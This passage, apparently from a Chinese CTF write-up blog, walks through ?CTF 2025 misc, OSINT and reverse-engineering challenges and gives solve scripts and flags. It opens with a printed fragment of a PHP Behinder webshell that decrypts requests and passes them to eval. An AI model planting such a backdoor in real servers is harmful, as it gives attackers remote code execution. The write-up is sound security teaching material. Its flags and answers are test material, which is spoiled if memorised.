class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>显然是冰蝎马</p>
<p>找到加密的命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd / ;openssl enc -des3 -salt -k W3lc0me2m1sc -in /flag -out /xp/www/week2/uploads/flag_decrypted.zip</span><br></pre></td></tr></table></figure>

<p>解密文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">openssl enc -d -des3 -salt -k W3lc0me2m1sc -in ./flag_decrypted.zip -out ./flag.txt</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1z_Beh1nd3r_Web5he1L_Ne7w0rk_Tr4ff1c&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week2-文化木的侦探委托-二"><a href="#Week2-文化木的侦探委托-二" class="headerlink" title="[Week2] 文化木的侦探委托(二)"></a>[Week2] 文化木的侦探委托(二)</h2><p>pngcheck可以看到文件尾部存在异常块</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pngcheck.win32.exe -v Blind2.png</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012113648882.png" alt="image-20251012113648882"></p>
<p>提取出尾部的异常块，并补齐图片头，得到和原图一样的图片</p>
<p>接着盲水印隐写</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012180358223.png" alt="image-20251012180358223"></p>
<p>根据题目的描述</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">（注：flag内为可识别的明文，仅首个单词的首字母大写，以flag&#123;&#125;包裹）</span><br></pre></td></tr></table></figure>

<p>连猜带蒙得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W@tch_underw@ter&#125;</span><br></pre></td></tr></table></figure>





<h1 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h1><h2 id="Week1-Task-1-见面地点"><a href="#Week1-Task-1-见面地点" class="headerlink" title="[Week1] Task 1. 见面地点"></a>[Week1] Task 1. 见面地点</h2><p>图片有GPS</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">34 deg 46&#x27; 18.33&quot; N, 113 deg 43&#x27; 14.42&quot; E</span><br></pre></td></tr></table></figure>

<p>转一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">34.771758, 113.720672</span><br></pre></td></tr></table></figure>

<p>GPS搜地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://gaode.com/regeo?lng=113.720672&amp;lat=34.771758</span><br></pre></td></tr></table></figure>

<p>搜周边地铁站即可</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;1_4_HuiZhanZhongXin&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week2-Task-2-方块世界？！"><a href="#Week2-Task-2-方块世界？！" class="headerlink" title="[Week2] Task 2. 方块世界？！"></a>[Week2] Task 2. 方块世界？！</h2><p>找到仓库</p>
<p><a target="_blank" rel="noopener" href="https://codeberg.org/what_is_the_flag/what-ctf-world/src/branch/main/level/_CTF%E4%B8%96%E7%95%8C.world">https://codeberg.org/what_is_the_flag/what-ctf-world/src/branch/main/level/_CTF%E4%B8%96%E7%95%8C.world</a></p>
<p>找到类似base64的码表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">M-ZA-Ln-za-m1-90+/=</span><br></pre></td></tr></table></figure>



<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012194121585.png" alt="image-20251012194121585"></p>
<p>找到几段类似base64的东西</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LZk6L4G1qI6hrH0J</span><br><span class="line">YTUkLR9jLyOPn0a7</span><br><span class="line">KIqwq4VmJ2D1s7Zs</span><br><span class="line">0doSDzQkpmYusC==</span><br><span class="line"></span><br><span class="line">zkuL4gSq</span><br><span class="line">10PnQNl</span><br><span class="line">Y1Y4Vm</span><br><span class="line">DlqFZs</span><br><span class="line">o4VsDzQ</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接着下载游戏去游玩</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012215305041.png" alt="image-20251012215305041"></p>
<p>找到flag了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LzkuL4gSqI6hrH0J</span><br><span class="line">YTUkLR9jLy0PnQNl</span><br><span class="line">KIY1Y4VmJ2DlqFZs</span><br><span class="line">o4VsDzQkpmYusC==</span><br></pre></td></tr></table></figure>

<p>base64解码得到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Funny_W0r1d_0f_Ch@rac43rs_Tru3_or_Fa1s3!&#125;</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251012215556187.png" alt="image-20251012215556187"></p>
<h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="Week1-8086ASM"><a href="#Week1-8086ASM" class="headerlink" title="[Week1] 8086ASM"></a>[Week1] 8086ASM</h2><p>AI一把梭</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251005004905613.png" alt="image-20251005004905613"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;W31c0m3_t0_8086_A5M_W0RlD___!!&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Week1-PlzDebugMe"><a href="#Week1-PlzDebugMe" class="headerlink" title="[Week1] PlzDebugMe"></a>[Week1] PlzDebugMe</h2><p>静态分析得到flag</p>
<p>可以直到这里做了异或，异或的key由 <code>sub_401656</code>函数生成，<code>dword_415080</code>的初始值为<code>123456</code></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#include &lt;windows.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> dword_415080 = <span class="number">123456</span>;</span><br><span class="line">unsigned char enc[<span class="number">32</span>] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x50</span>, <span class="number">0xA1</span>, <span class="number">0x25</span>, <span class="number">0x84</span>, <span class="number">0x8E</span>, <span class="number">0x61</span>, <span class="number">0xC4</span>, <span class="number">0x6B</span>, <span class="number">0xBB</span>, </span><br><span class="line">  <span class="number">0xAE</span>, <span class="number">0x05</span>, <span class="number">0x0B</span>, <span class="number">0xC6</span>, <span class="number">0x3D</span>, <span class="number">0x42</span>, <span class="number">0x5A</span>, <span class="number">0xFB</span>, <span class="number">0xC1</span>, <span class="number">0xC9</span>, </span><br><span class="line">  <span class="number">0x4E</span>, <span class="number">0xE9</span>, <span class="number">0x8D</span>, <span class="number">0x50</span>, <span class="number">0x91</span>, <span class="number">0x87</span>, <span class="number">0x87</span>, <span class="number">0x24</span>, <span class="number">0xAD</span>, <span class="number">0xAF</span>, </span><br><span class="line">  <span class="number">0xD5</span>, <span class="number">0x36</span></span><br><span class="line">&#125;;</span><br><span class="line">unsigned <span class="built_in">int</span> sub_401656()</span><br><span class="line">&#123;</span><br><span class="line">  dword_415080 = <span class="number">1103515245</span> * dword_415080 + <span class="number">12345</span>;</span><br><span class="line">  <span class="keyword">return</span> HIWORD(dword_415080) &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">int</span> main()&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(<span class="built_in">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)&#123;</span><br><span class="line">		cout &lt;&lt; char(sub_401656()^enc[i]); </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Week1-ezCSharp"><a href="#Week1-ezCSharp" class="headerlink" title="[Week1] ezCSharp"></a>[Week1] ezCSharp</h2><p>dnspy反编译</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251005010038155.png" alt="image-20251005010038155"></p>
<p>显然是小写字母凯撒1</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = <span class="string">b&#x27;D1ucj0u!tqjwf!fohjoffsjoh!xj!epspqz!ju!gvo!2025&#x27;</span></span><br><span class="line">enc = enc.replace(<span class="string">b&#x27;!&#x27;</span>,<span class="string">b&#x27;_&#x27;</span>)</span><br><span class="line">lists = <span class="string">b&#x27;bcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">lists = &#123;i:i-<span class="number">1</span> <span class="keyword">for</span> i <span class="keyword">in</span> lists&#125;</span><br><span class="line">lists[<span class="string">b&#x27;a&#x27;</span>] = <span class="string">b&#x27;z&#x27;</span></span><br><span class="line"></span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> lists:</span><br><span class="line">        res += [lists[i]]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += [i]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print(bytes(res))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;flag&#123;&#123;<span class="subst">&#123;<span class="built_in">bytes</span>(res).decode()&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="comment"># flag&#123;D1tbi0t_spive_engineering_wi_doropy_it_fun_2025&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week1-jvav"><a href="#Week1-jvav" class="headerlink" title="[Week1] jvav"></a>[Week1] jvav</h2><p>看到加密部分</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251005011338834.png" alt="image-20251005011338834"></p>
<p>根据逻辑逆向</p>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        decode();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] enc = &#123;-<span class="number">89</span>, <span class="number">96</span>, <span class="number">102</span>, <span class="number">118</span>, -<span class="number">89</span>, -<span class="number">122</span>, <span class="number">103</span>, -<span class="number">103</span>, -<span class="number">125</span>, -<span class="number">95</span>, <span class="number">114</span>, <span class="number">117</span>, -<span class="number">116</span>, -<span class="number">102</span>, <span class="number">114</span>, -<span class="number">115</span>, -<span class="number">125</span>, <span class="number">108</span>, <span class="number">110</span>, <span class="number">118</span>, -<span class="number">91</span>, -<span class="number">83</span>, <span class="number">101</span>, -<span class="number">115</span>, -<span class="number">116</span>, -<span class="number">114</span>, <span class="number">124</span>, <span class="number">114</span>, -<span class="number">123</span>, -<span class="number">87</span>, -<span class="number">87</span>, -<span class="number">114</span>, <span class="number">121</span>, <span class="number">108</span>, <span class="number">124</span>, -<span class="number">114</span>&#125;;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> enc.length;</span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[length];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            bArr[i] = enc[(i - <span class="number">5</span> + length) % enc.length];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; length; i++) &#123;</span><br><span class="line">            bArr[i] = (<span class="type">byte</span>)(((~bArr[i])^<span class="number">11</span>)-<span class="number">32</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] data = Base64.getDecoder().decode(bArr);</span><br><span class="line">        System.out.println(<span class="keyword">new</span> <span class="title class_">String</span>(data));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag&#123;kotl1n_is_also_java&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="Week1-ezCalculate"><a href="#Week1-ezCalculate" class="headerlink" title="[Week1] ezCalculate"></a>[Week1] ezCalculate</h2><p>根据代码逻辑，反过来运算即可</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251005012949313.png" alt="image-20251005012949313"></p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">key = <span class="string">b&#x27;wwqessgxsddkaao123wms&#x27;</span></span><br><span class="line">answer=[</span><br><span class="line">  <span class="number">0x33</span>, <span class="number">0x1D</span>, <span class="number">0x32</span>, <span class="number">0x44</span>, <span class="number">0x2A</span>, <span class="number">0x54</span>, <span class="number">0x45</span>, <span class="number">0x2C</span>, <span class="number">0x2E</span>, <span class="number">0x74</span>, </span><br><span class="line">  <span class="number">0x8C</span>, <span class="number">0x4B</span>, <span class="number">0x40</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0x82</span>, <span class="number">0x24</span>, <span class="number">0x35</span>, </span><br><span class="line">  <span class="number">0x10</span>]</span><br><span class="line">res = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">21</span>):</span><br><span class="line">    res += [((answer[i]+key[i%<span class="built_in">len</span>(key)])^key[i%<span class="built_in">len</span>(key)])-key[i%<span class="built_in">len</span>(key)]]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(res))</span><br><span class="line"><span class="comment"># b&#x27;flag&#123;Add_X0r_and_Sub&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="Week1-rand"><a href="#Week1-rand" class="headerlink" title="[Week1] rand"></a>[Week1] rand</h2><p>伪随机，种子固定，逆向即可</p>
<p><del>AI梭了</del></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> target_data[<span class="number">27</span>] = &#123;</span><br><span class="line">  <span class="number">0x5A</span>, <span class="number">0x66</span>, <span class="number">0x86</span>, <span class="number">0xCE</span>, <span class="number">0x46</span>, <span class="number">0x23</span>, <span class="number">0x75</span>, <span class="number">0x30</span>, <span class="number">0x18</span>, <span class="number">0x6F</span>, </span><br><span class="line">  <span class="number">0x5B</span>, <span class="number">0x7D</span>, <span class="number">0x4D</span>, <span class="number">0x4F</span>, <span class="number">0xF7</span>, <span class="number">0xC4</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x45</span>, <span class="number">0xAE</span>, </span><br><span class="line">  <span class="number">0x36</span>, <span class="number">0xEF</span>, <span class="number">0x6B</span>, <span class="number">0x81</span>, <span class="number">0xC1</span>, <span class="number">0x82</span>, <span class="number">0x03</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 保存洗牌时使用的随机索引，用于逆向操作</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="type">int</span> idx1;</span><br><span class="line">    <span class="type">int</span> idx2;</span><br><span class="line">&#125; SwapRecord;</span><br><span class="line"></span><br><span class="line">SwapRecord swap_records[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成与原程序相同的随机数序列并记录洗牌操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">generate_swap_records</span><span class="params">(<span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">        <span class="type">int</span> v5 = <span class="built_in">rand</span>() % len;</span><br><span class="line">        <span class="type">int</span> v6 = <span class="built_in">rand</span>();</span><br><span class="line">        <span class="type">int</span> v8 = v6 % len;</span><br><span class="line">        swap_records[i].idx1 = v5;</span><br><span class="line">        swap_records[i].idx2 = v8;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成与原程序相同的异或密钥序列</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">generate_xor_keys</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> *keys, <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        keys[i] = <span class="built_in">rand</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 逆向洗牌操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">reverse_shuffle</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">size_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 反向执行洗牌步骤</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">255</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="type">int</span> idx1 = swap_records[i].idx1;</span><br><span class="line">        <span class="type">int</span> idx2 = swap_records[i].idx2;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 交换两个位置的字符（与加密时相同的操作，因为交换是可逆的）</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> temp = data[idx1];</span><br><span class="line">        data[idx1] = data[idx2];</span><br><span class="line">        data[idx2] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">size_t</span> len = <span class="number">27</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> decrypted[<span class="number">28</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> xor_keys[<span class="number">27</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">memcpy</span>(decrypted, target_data, len);</span><br><span class="line">    <span class="built_in">srand</span>(<span class="number">0x3039</span>u);</span><br><span class="line">    <span class="built_in">generate_swap_records</span>(len);</span><br><span class="line">    <span class="built_in">generate_xor_keys</span>(xor_keys, len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        decrypted[i] ^= (xor_keys[i] &amp; <span class="number">0xFF</span>); </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">reverse_shuffle</span>(decrypted, len);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag: %s\n&quot;</span>, decrypted);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week2-CPPReverse"><a href="#Week2-CPPReverse" class="headerlink" title="[Week2] CPPReverse"></a>[Week2] CPPReverse</h2><p>逆向可以知道，先反转再加密，最后再反转一次</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013022635229.png" alt="image-20251013022635229"></p>
<p>接着是加密逻辑</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/%EF%BC%9FCTF2025_week1&week2_WP/image-20251013022656541.png" alt="image-20251013022656541"></p>
<p>逆向一下得到flag</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pre_enc = <span class="string">&#x27;EE1A9B5AFA59AF28DE5D594F8FB990B1D1345590&#x27;</span>[::-<span class="number">1</span>]</span><br><span class="line">enc = <span class="built_in">bytes</span>.fromhex(pre_enc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">data</span>):</span><br><span class="line">    res = [<span class="number">0</span>]*<span class="built_in">len</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)-<span class="number">1</span>,-<span class="number">1</span>,-<span class="number">1</span>):</span><br><span class="line">        tmp = data[i]</span><br><span class="line">        <span class="keyword">if</span> i&gt;<span class="number">0</span>:</span><br><span class="line">            tmp ^= (data[i-<span class="number">1</span>]-<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> (i % <span class="number">2</span>)==<span class="number">0</span>:</span><br><span class="line">            tmp ^= <span class="number">7</span></span><br><span class="line">        tmp -= i+<span class="number">7</span></span><br><span class="line">        tmp = tmp&amp;<span class="number">0xff</span></span><br><span class="line">        res[i] = tmp</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">bytes</span>(res)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;flag&#123;&#123;<span class="subst">&#123;decode(enc).<span class="built_in">hex</span>().upper()[::-<span class="number">1</span>]&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;4350505F526576657253655F4578705F55705570&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="Week2-Pyc"><a href="#Week2-Pyc" class="headerlink" title="[Week2] Pyc"></a>[Week2] Pyc</h2><p><code>pyinstxtractor</code>解压，然后反编译</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Ciallo~&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Plz input your flag~&#x27;</span>)</span><br><span class="line">flag = <span class="built_in">input</span>()</span><br><span class="line">flag_list = <span class="built_in">list</span>(flag)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag_list)):</span><br><span class="line">    a = flag_list[i]</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;a&#x27;</span> &lt;= a &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">        a = <span class="built_in">ord</span>(a)</span><br><span class="line">        a = (a - <span class="number">12</span>) * <span class="number">2</span> + <span class="number">6</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= a &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            a = <span class="built_in">ord</span>(a)</span><br><span class="line">            a = (a + <span class="number">6</span>) * <span class="number">3</span> + <span class="number">9</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            a = <span class="built_in">ord</span>(a)</span><br><span class="line">            a = a + <span class="number">11</span></span><br><span class="line">    flag_list[i] = <span class="built_in">chr</span>(a)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span>.join(flag_list)</span><br><span class="line">    hex_flag = <span class="string">&#x27;,&#x27;</span>.join([<span class="built_in">hex</span>(<span class="built_in">ord</span>(c)) <span class="keyword">for</span> c <span class="keyword">in</span> flag])</span><br><span class="line">    data = <span class="string">&#x27;0xba,0xc6,0xb0,0xbc,0x86,0x10b,0x126,0xe4,0x6a,0xc0,0x40,0x6a,0xda,0x3f,0xd2,0xe0,0x6a,0xb8,0x3f,0xd4,0xe0,0x89,0x88&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> data != hex_flag:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;wrong~&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;great~&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">enc = [<span class="number">0xba</span>,<span class="number">0xc6</span>,<span class="number">0xb0</span>,<span class="number">0xbc</span>,<span class="number">0x86</span>,<span class="number">0x10b</span>,<span class="number">0x126</span>,<span class="number">0xe4</span>,<span class="number">0x6a</span>,<span class="number">0xc0</span>,<span class="number">0x40</span>,<span class="number">0x6a</span>,<span class="number">0xda</span>,<span class="number">0x3f</span>,<span class="number">0xd2</span>,<span class="number">0xe0</span>,<span class="number">0x6a</span>,<span class="number">0xb8</span>,<span class="number">0x3f</span>,<span class="number">0xd4</span>,<span class="number">0xe0</span>,<span class="number">0x89</span>,<span class="number">0x88</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">dict</span> = &#123;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>)+<span class="number">1</span>,<span class="number">1</span>):</span><br><span class="line">    tmp = (i - <span class="number">12</span>) * <span class="number">2</span> + <span class="number">6</span></span><br><span class="line">    <span class="built_in">dict</span>[tmp] = <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)+<span class="number">1</span>,<span class="number">1</span>):</span><br><span class="line">    tmp = (i + <span class="number">6</span>) * <span class="number">3</span> + <span class="number">9</span></span><br><span class="line">    <span class="built_in">dict</span>[tmp] = <span class="built_in">chr</span>(i)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> enc:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> <span class="built_in">dict</span>:</span><br><span class="line">        flag += <span class="built_in">dict</span>[i]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += <span class="built_in">chr</span>(i-<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span 